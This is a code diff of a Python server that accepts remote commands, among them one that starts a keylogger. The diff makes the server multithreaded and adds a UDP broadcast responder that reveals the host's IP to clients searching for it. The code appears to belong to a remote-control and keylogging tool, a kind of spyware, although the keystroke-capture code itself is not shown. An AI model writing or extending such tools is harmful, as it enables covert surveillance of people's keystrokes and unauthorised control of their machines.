@@ -56,6 +56,7 @@ def handle_client(conn):
         else:
             continue
 
+
         if command == "keylogger_start":
             if not recording:
                 print("Attempting to start keylogger...")
@@ -156,24 +157,32 @@ def handle_client(conn):
         else:
             conn.sendall(b"Command not recognized")
 
-# Основная функция для запуска сервера
 def start_server():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
-        server_socket.bind(('0.0.0.0', 8080))
-        server_socket.listen(1)
-        print("Server listening on port 8080")
+    # Create a TCP socket for client connections
+    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    tcp_server_socket.bind(('', 8080))
+    tcp_server_socket.listen(5)  # Allow up to 5 pending connections
+    print("Server listening for TCP connections on port 8080...")
+
+    # Create a separate thread for listening to UDP broadcasts
+    threading.Thread(target=udp_broadcast_listener, daemon=True).start()
+
+    while True:
+        conn, addr = tcp_server_socket.accept()
+        print(f"Client connected from {addr}")
+        # Handle the client in a new thread
+        threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
+
+def udp_broadcast_listener():
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
+        server_socket.bind(('', 8081))  # Use a different port for UDP broadcasts
+        print("Server listening for broadcast...")
         while True:
-            conn, addr = server_socket.accept()
-            print("Connection from {}".format(addr))
-            conn.sendall(b"SERVER_READY")  # Уведомляем клиента о готовности сервера
-            threading.Thread(target=handle_client, args=(conn,)).start()
+            data, addr = server_socket.recvfrom(1024)
+            if data.decode('utf-8') == "DISCOVER_SERVER":
+                server_ip = socket.gethostbyname(socket.gethostname())
+                server_socket.sendto(f"SERVER_IP:{server_ip}".encode('utf-8'), addr)
+
 
 if __name__ == "__main__":
-    try:
-        start_server()
-    except KeyboardInterrupt:
-        print("\nServer stopped by user.")
-    except Exception as e:
-        print("An error occurred: {}".format(e))
-    finally:
-        onexit()  # Убедитесь, что все ресурсы освобождены
+    start_server()
